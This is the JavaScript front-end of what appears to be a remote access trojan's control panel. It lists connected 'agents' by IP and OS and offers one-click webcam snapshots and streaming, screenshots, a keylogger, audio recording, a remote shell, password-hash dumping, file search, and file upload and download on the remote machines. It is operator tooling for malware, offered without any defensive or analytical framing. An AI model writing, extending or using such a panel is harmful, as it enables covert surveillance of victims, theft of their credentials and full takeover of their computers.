function formatDuration(seconds) {
  if (seconds < 60) return Math.floor(seconds) + "s";
  if (seconds < 3600)
    return Math.floor(seconds / 60) + "m " + Math.floor(seconds % 60) + "s";
  return (
    Math.floor(seconds / 3600) + "h " + Math.floor((seconds % 3600) / 60) + "m"
  );
}

function getOsDisplay(os) {
  const display = {
    linux: "Linux",
    windows: "Windows",
    darwin: "macOS",
    unknown: "Unknown",
  };
  return display[os] || display.unknown;
}

function getOsBadgeClass(os) {
  const classes = {
    linux: "bg-green-100 text-green-700",
    windows: "bg-blue-100 text-blue-700",
    darwin: "bg-amber-100 text-amber-700",
    unknown: "bg-gray-100 text-gray-600",
  };
  return classes[os] || classes.unknown;
}

function setLoading(loading) {
  const skeletonBody = document.getElementById("skeleton-body");
  const agentsBody = document.getElementById("agents-body");
  if (loading) {
    skeletonBody.classList.remove("hidden");
    agentsBody.classList.add("hidden");
  } else {
    skeletonBody.classList.add("hidden");
    agentsBody.classList.remove("hidden");
  }
}

function loadAgents() {
  setLoading(true);
  fetch("/api/agents")
    .then((r) => r.json())
    .then((data) => {
      const tbody = document.getElementById("agents-body");
      if (data.agents.length === 0) {
        tbody.innerHTML =
          '<tr><td colspan="7" class="px-4 py-12 text-center text-gray-400">No agents connected</td></tr>';
        setLoading(false);
        return;
      }
      tbody.innerHTML = data.agents
        .map(
          (a) => `
                <tr class="hover:bg-gray-50 transition-colors">
                    <td class="px-4 py-3">
                        <div class="flex items-center gap-2">
                            <span class="w-2 h-2 rounded-full bg-green-500 animate-pulse"></span>
                            <span class="text-gray-700">Online</span>
                        </div>
                    </td>
                    <td class="px-4 py-3">
                        <div class="flex items-center gap-2">
                            <span class="font-mono text-sm text-gray-800 break-all whitespace-normal">${
                              a.id
                            }</span>
                            <button onclick="navigator.clipboard.writeText('${
                              a.id
                            }')" class="text-gray-400 hover:text-gray-600 cursor-pointer" title="Copy ID">
                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path>
                                </svg>
                            </button>
                        </div>
                    </td>
                    <td class="px-4 py-3 font-mono text-sm text-gray-800">${
                      a.ip
                    }</td>
                    <td class="px-4 py-3">
                        <span class="inline-block px-2 py-1 rounded text-xs font-medium ${getOsBadgeClass(
                          a.os
                        )}">${getOsDisplay(a.os)}</span>
                    </td>
                    <td class="px-4 py-3 text-gray-600">${formatDuration(
                      a.uptime
                    )}</td>
                    <td class="px-4 py-3 text-gray-600">${formatDuration(
                      a.idle
                    )} ago</td>
                    <td class="px-4 py-3">
                        <div class="flex items-center gap-1 flex-wrap">
                            <button onclick="testAgent('${
                              a.id
                            }')" class="p-1.5 text-gray-500 hover:text-primary hover:bg-primary/10 rounded transition-colors cursor-pointer" title="Test">
                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                            </button>
                            <button onclick="showDownloadModal('${
                              a.id
                            }')" class="p-1.5 text-gray-500 hover:text-primary hover:bg-primary/10 rounded transition-colors cursor-pointer" title="Download">
                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg>
                            </button>
                            <button onclick="showUploadModal('${
                              a.id
                            }')" class="p-1.5 text-gray-500 hover:text-primary hover:bg-primary/10 rounded transition-colors cursor-pointer" title="Upload">
                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-8l-4-4m0 0L8 8m4-4v12"></path></svg>
                            </button>
                            <button onclick="webcamSnapshot('${
                              a.id
                            }')" class="p-1.5 text-gray-500 hover:text-primary hover:bg-primary/10 rounded transition-colors cursor-pointer" title="Webcam Snapshot">
                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
                            </button>
                            <button onclick="toggleWebcamStream('${
                              a.id
                            }')" class="p-1.5 text-gray-500 hover:text-primary hover:bg-primary/10 rounded transition-colors cursor-pointer" title="Webcam Stream">
                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
                            </button>
                            <button onclick="takeScreenshot('${
                              a.id
                            }')" class="p-1.5 text-gray-500 hover:text-primary hover:bg-primary/10 rounded transition-colors cursor-pointer" title="Screenshot">
                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path></svg>
                            </button>
                            <button onclick="startKeylogger('${
                              a.id
                            }')" class="p-1.5 text-gray-500 hover:text-primary hover:bg-primary/10 rounded transition-colors cursor-pointer" title="Keylogger">
                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z"></path></svg>
                            </button>
                            <button onclick="runShell('${
                              a.id
                            }')" class="p-1.5 text-gray-500 hover:text-primary hover:bg-primary/10 rounded transition-colors cursor-pointer" title="Shell">
                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
                            </button>
                            <button onclick="runHashdump('${
                              a.id
                            }')" class="p-1.5 text-gray-500 hover:text-primary hover:bg-primary/10 rounded transition-colors cursor-pointer" title="Hashdump">
                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 7v10c0 2.21 3.582 4 8 4s8-1.79 8-4V7M4 7c0 2.21 3.582 4 8 4s8-1.79 8-4M4 7c0-2.21 3.582-4 8-4s8 1.79 8 4m0 5c0 2.21-3.582 4-8 4s-8-1.79-8-4"></path></svg>
                            </button>
                            <button onclick="runIpconfig('${
                              a.id
                            }')" class="p-1.5 text-gray-500 hover:text-primary hover:bg-primary/10 rounded transition-colors cursor-pointer" title="IP Config">
                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"></path></svg>
                            </button>
                            <button onclick="runRecordAudio('${
                              a.id
                            }')" class="p-1.5 text-gray-500 hover:text-primary hover:bg-primary/10 rounded transition-colors cursor-pointer" title="Record Audio">
                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v4m0 0H8m4 0h4m-4-8a3 3 0 01-3-3V5a3 3 0 116 0v6a3 3 0 01-3 3z"></path></svg>
                            </button>
                            <button onclick="runSearch('${
                              a.id
                            }')" class="p-1.5 text-gray-500 hover:text-primary hover:bg-primary/10 rounded transition-colors cursor-pointer" title="Search Files">
                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
                            </button>
                            <button onclick="disconnectAgent('${
                              a.id
                            }')" class="p-1.5 text-gray-500 hover:text-red-600 hover:bg-red-50 rounded transition-colors cursor-pointer" title="Disconnect">
                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>
                            </button>
                        </div>
                    </td>
                </tr>
            `
        )
        .join("");
      setLoading(false);
    })
    .catch(() => setLoading(false));
}

loadAgents();
loadStats();
setInterval(loadAgents, 5000);
setInterval(loadStats, 5000);

function loadStats() {
  fetch("/api/stats")
    .then((r) => r.json())
    .then((data) => {
      document.getElementById(
        "stat-active"
      ).textContent = `${data.active}/${data.max}`;
      document.getElementById("stat-ips").textContent = data.unique_ips;
      document.getElementById("stat-banned").textContent = data.banned_count;
      document.getElementById("stat-max").textContent = data.max;
    })
    .catch(() => {});
}

function testAgent(agentId) {
  if (!confirm(`Send test command to agent ${agentId.substring(0, 8)}...?`))
    return;
  fetch(`/api/agents/${agentId}/test`, { method: "POST" })
    .then((r) => r.json())
    .then((data) => alert(data.success ? "Test OK" : `Error: ${data.error}`))
    .catch(() => alert("Request failed"));
}

function disconnectAgent(agentId) {
  if (!confirm(`Disconnect agent ${agentId.substring(0, 8)}...?`)) return;
  fetch(`/api/agents/${agentId}/disconnect`, { method: "POST" })
    .then((r) => r.json())
    .then((data) => {
      alert(data.success ? "Disconnected" : `Error: ${data.error}`);
      loadAgents();
    })
    .catch(() => alert("Request failed"));
}

function showDownloadModal(agentId) {
  const remote = prompt("Remote file path:");
  if (!remote) return;
  const local = prompt("Local save path:");
  if (!local) return;
  fetch(`/api/agents/${agentId}/download`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ remote_path: remote, local_path: local }),
  })
    .then((r) => r.json())
    .then((data) => alert(data.success ? "Downloaded" : `Error: ${data.error}`))
    .catch(() => alert("Request failed"));
}

function showUploadModal(agentId) {
  const local = prompt("Local file path:");
  if (!local) return;
  const remote = prompt("Remote destination path:");
  if (!remote) return;
  fetch(`/api/agents/${agentId}/upload`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ local_path: local, remote_path: remote }),
  })
    .then((r) => r.json())
    .then((data) => alert(data.success ? "Uploaded" : `Error: ${data.error}`))
    .catch(() => alert("Request failed"));
}

function showConfigureModal() {
  const settings = [
    "max_file_size_in_bytes",
    "max_connections_per_ip_per_minute",
    "max_concurrent_connections_per_ip",
    "max_total_connections",
    "rate_limit_ban_seconds",
  ];
  const setting = prompt(`Setting to change:\n${settings.join("\n")}`);
  if (!setting || !settings.includes(setting)) return;
  const value = prompt(`New value for ${setting}:`);
  if (!value) return;
  fetch("/api/configure", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ setting, value }),
  })
    .then((r) => r.json())
    .then((data) => {
      alert(
        data.success ? `Set ${setting} to ${value}` : `Error: ${data.error}`
      );
      loadStats();
    })
    .catch(() => alert("Request failed"));
}

function shutdownServer() {
  if (!confirm("Are you sure you want to shutdown the server?")) return;
  if (!confirm("This will disconnect all agents. Continue?")) return;
  fetch("/api/shutdown", { method: "POST" })
    .then((r) => r.json())
    .then((data) =>
      alert(data.success ? "Server shutting down..." : `Error: ${data.error}`)
    )
    .catch(() => alert("Request failed"));
}

function webcamSnapshot(agentId) {
  const camera = prompt("Camera index (default 0):") || "0";
  fetch(`/api/agents/${agentId}/webcam/snapshot`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ camera: parseInt(camera) }),
  })
    .then((r) => r.json())
    .then((data) => {
      if (data.success) {
        const win = window.open();
        win.document.write(
          `<img src="data:image/${data.format};base64,${data.image_data}" style="max-width:100%">`
        );
      } else {
        alert(`Error: ${data.error}`);
      }
    })
    .catch(() => alert("Request failed"));
}

const activeStreams = {};

function toggleWebcamStream(agentId) {
  const shortId = agentId.substring(0, 8);
  if (activeStreams[agentId]) {
    activeStreams[agentId] = false;
    fetch(`/api/agents/${agentId}/webcam/stream`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ action: "stop" }),
    }).catch(() => {});
    alert("Stream stopped");
  } else {
    const camera = prompt("Camera index (default 0):") || "0";
    activeStreams[agentId] = true;
    fetch(`/api/agents/${agentId}/webcam/stream`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        action: "start",
        camera: parseInt(camera),
        fps: 10,
      }),
    })
      .then((r) => r.json())
      .then((data) => {
        if (data.success) {
          alert("Stream started. Click again to stop.");
          pollStream(agentId);
        } else {
          activeStreams[agentId] = false;
          alert(`Error: ${data.error}`);
        }
      })
      .catch(() => {
        activeStreams[agentId] = false;
        alert("Request failed");
      });
  }
}

function pollStream(agentId) {
  if (!activeStreams[agentId]) return;
  fetch(`/api/agents/${agentId}/webcam/stream`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ action: "get_frame" }),
  })
    .then((r) => r.json())
    .then((data) => {
      if (data.success && data.frame && activeStreams[agentId]) {
        const win = window.open("", `stream_${agentId}`);
        win.document.write(
          `<img src="data:image/jpeg;base64,${data.frame.data}" style="max-width:100%">`
        );
        setTimeout(() => pollStream(agentId), 500);
      }
    })
    .catch(() => {
      if (activeStreams[agentId]) setTimeout(() => pollStream(agentId), 1000);
    });
}

function takeScreenshot(agentId) {
  fetch(`/api/agents/${agentId}/screenshot`, { method: "POST" })
    .then((r) => r.json())
    .then((data) => {
      if (data.success) {
        const win = window.open();
        win.document.write(
          `<img src="data:image/png;base64,${data.image_data}" style="max-width:100%">`
        );
      } else {
        alert(`Error: ${data.error}`);
      }
    })
    .catch(() => alert("Request failed"));
}

function startKeylogger(agentId) {
  const action = prompt("Keylogger action (start/stop/get/status):");
  if (!action) return;
  fetch(`/api/agents/${agentId}/keylogger`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ action }),
  })
    .then((r) => r.json())
    .then((data) =>
      alert(
        data.success
          ? JSON.stringify(data.result, null, 2)
          : `Error: ${data.error}`
      )
    )
    .catch(() => alert("Request failed"));
}

function runShell(agentId) {
  const cmd = prompt("Enter shell command:");
  if (!cmd) return;
  fetch(`/api/agents/${agentId}/shell`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ command: cmd }),
  })
    .then((r) => r.json())
    .then((data) => alert(data.success ? data.result : `Error: ${data.error}`))
    .catch(() => alert("Request failed"));
}

function runHashdump(agentId) {
  if (!confirm("Run hashdump to extract password hashes?")) return;
  fetch(`/api/agents/${agentId}/hashdump`, { method: "POST" })
    .then((r) => r.json())
    .then((data) =>
      alert(
        data.success
          ? JSON.stringify(data.result, null, 2)
          : `Error: ${data.error}`
      )
    )
    .catch(() => alert("Request failed"));
}

function runIpconfig(agentId) {
  fetch(`/api/agents/${agentId}/ipconfig`, { method: "POST" })
    .then((r) => r.json())
    .then((data) =>
      alert(
        data.success
          ? JSON.stringify(data.result, null, 2)
          : `Error: ${data.error}`
      )
    )
    .catch(() => alert("Request failed"));
}

function runRecordAudio(agentId) {
  const action = prompt("Audio action (start/stop/status):");
  if (!action) return;
  fetch(`/api/agents/${agentId}/record_audio`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ action }),
  })
    .then((r) => r.json())
    .then((data) =>
      alert(
        data.success
          ? JSON.stringify(data.result, null, 2)
          : `Error: ${data.error}`
      )
    )
    .catch(() => alert("Request failed"));
}

function runSearch(agentId) {
  const pattern = prompt("Search pattern:");
  if (!pattern) return;
  const path = prompt("Search path (optional):") || "";
  fetch(`/api/agents/${agentId}/search`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ pattern, path }),
  })
    .then((r) => r.json())
    .then((data) =>
      alert(
        data.success
          ? JSON.stringify(data.result, null, 2)
          : `Error: ${data.error}`
      )
    )
    .catch(() => alert("Request failed"));
}
